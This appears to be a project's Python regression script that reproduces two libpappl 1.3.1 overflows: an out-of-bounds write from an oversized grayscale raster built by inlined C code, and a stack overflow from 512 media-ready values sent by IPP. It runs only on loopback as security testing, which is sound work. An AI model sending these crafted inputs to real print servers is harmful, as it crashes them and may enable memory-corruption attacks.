#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-only
"""Reproduce the two confirmed libpappl 1.3.1 overflows the driver rides on.

These are S-1 and S-2 in docs/SECURITY-REVIEW.md: an out-of-bounds write while
libpappl dithers an 8-bit raster wider than the page, and a stack overflow when
a client sends more media-ready values than PAPPL_MAX_SOURCE. Neither has a fix
this project can make; the point of the script is that the findings can be
re-run, and that they turn themselves off when libpappl is finally patched.

Each case submits its input over the loopback IPP port and asserts the server
process died from a signal. If a future libpappl no longer crashes, the case
FAILS here, which is the signal to retire the corresponding row in the review.

Everything is loopback and scoped to a temporary directory: XDG_CONFIG_HOME and
TMPDIR point into it, so the developer's own PAPPL state is never touched.

Requires: cargo build -p ml216x-printer-app, cc, libcups2-dev, ipptool.
"""
import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "target/debug/ml216x-printer-app"

# S-1's generator, inlined so the script is self-contained. It writes an 8-bit
# grayscale PWG raster whose width is overridden to something wider than any
# page, which is exactly the geometry libpappl's dither loop fails to bound.
WIDE_GRAY_C = r"""
#include <cups/raster.h>
#include <cups/pwg.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
int main(int argc, char **argv) {
  if (argc != 4) return 2;
  unsigned width = (unsigned)atoi(argv[2]), height = (unsigned)atoi(argv[3]);
  cups_page_header2_t h;
  memset(&h, 0, sizeof(h));
  pwg_media_t *media = pwgMediaForPWG("iso_a4_210x297mm");
  if (!media || !cupsRasterInitPWGHeader(&h, media, "sgray_8", 600, 600, "one-sided", "normal"))
    return 3;
  h.cupsWidth = width;
  h.cupsHeight = height;
  h.cupsBytesPerLine = width;
  int fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0600);
  if (fd < 0) return 4;
  cups_raster_t *r = cupsRasterOpen(fd, CUPS_RASTER_WRITE_PWG);
  if (!r || !cupsRasterWriteHeader2(r, &h)) return 5;
  unsigned char *line = malloc(h.cupsBytesPerLine);
  if (!line) return 6;
  memset(line, 0x80, h.cupsBytesPerLine);
  for (unsigned y = 0; y < h.cupsHeight; y++)
    if (cupsRasterWritePixels(r, line, h.cupsBytesPerLine) != h.cupsBytesPerLine) return 7;
  free(line); cupsRasterClose(r); close(fd);
  return 0;
}
"""

MEDIA = ["iso_a4_210x297mm", "na_letter_8.5x11in", "iso_a5_148x210mm", "iso_a6_105x148mm"]


def wait_for_port(port):
    for _ in range(200):
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=.1):
                return True
        except OSError:
            time.sleep(.05)
    return False


def start_server(tmp, env, port):
    log = (tmp / "server.log").open("w+")
    server = subprocess.Popen(
        [str(APP), "--probe-output", str(tmp / "out.spl"), "--listen-port", str(port),
         "--spool-directory", str(tmp / "spool"), "server"],
        stdout=log, stderr=log, env=env)
    if not wait_for_port(port):
        raise SystemExit("server did not start")
    return server, log


def dither_input(tmp, env):
    source = tmp / "wide-gray.c"
    source.write_text(WIDE_GRAY_C)
    generator = tmp / "wide-gray"
    subprocess.run(["cc", "-Wall", "-Wextra", "-Werror", source, "-lcups", "-o", generator],
                   check=True, env=env)
    raster = tmp / "wide.pwg"
    subprocess.run([generator, raster, "40000", "64"], check=True, env=env)
    return f'''{{
NAME "S-1 wide 8-bit grayscale"
OPERATION Print-Job
GROUP operation-attributes-tag
ATTR charset attributes-charset utf-8
ATTR naturalLanguage attributes-natural-language en
ATTR uri printer-uri $uri
ATTR name requesting-user-name tester
ATTR mimeMediaType document-format image/pwg-raster
FILE {raster}
}}
'''


def ready_media_input(tmp, env):
    values = ",".join(MEDIA[i % len(MEDIA)] for i in range(512))
    return f'''{{
NAME "S-2 oversized media-ready"
OPERATION Set-Printer-Attributes
GROUP operation-attributes-tag
ATTR charset attributes-charset utf-8
ATTR naturalLanguage attributes-natural-language en
ATTR uri printer-uri $uri
ATTR name requesting-user-name tester
GROUP printer-attributes-tag
ATTR keyword media-ready {values}
}}
'''


CASES = {"dither": dither_input, "ready-media": ready_media_input}


def run_case(name, port):
    if not APP.exists():
        raise SystemExit("build first: cargo build -p ml216x-printer-app")
    with tempfile.TemporaryDirectory(prefix=f"ml216x-sec-{name}-") as temp:
        tmp = Path(temp)
        env = dict(os.environ, XDG_CONFIG_HOME=str(tmp), TMPDIR=str(tmp))
        server, log = start_server(tmp, env, port)
        try:
            test = tmp / "case.test"
            test.write_text(CASES[name](tmp, env))
            subprocess.run(
                ["ipptool", "-t", f"ipp://127.0.0.1:{port}/ipp/print/probe", str(test)],
                capture_output=True, text=True, env=env, timeout=60)
            time.sleep(2)
            code = server.poll()
        finally:
            if server.poll() is None:
                server.terminate()
                try:
                    server.wait(timeout=10)
                except subprocess.TimeoutExpired:
                    server.kill()
        if code is not None and code < 0:
            print(f"PASS {name}: the server was killed by signal {-code}, "
                  f"reproducing the overflow")
            return True
        print(f"FAIL {name}: the server did not crash (exit {code}); "
              f"libpappl may be patched — check and retire this finding")
        log.seek(0)
        print("\n".join(log.read().splitlines()[-6:]))
        return False


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--case", choices=[*CASES, "all"], default="all")
    parser.add_argument("--port", type=int, default=8633)
    args = parser.parse_args()
    cases = list(CASES) if args.case == "all" else [args.case]
    ok = True
    for offset, name in enumerate(cases):
        ok = run_case(name, args.port + offset) and ok
    sys.exit(0 if ok else 1)


main()
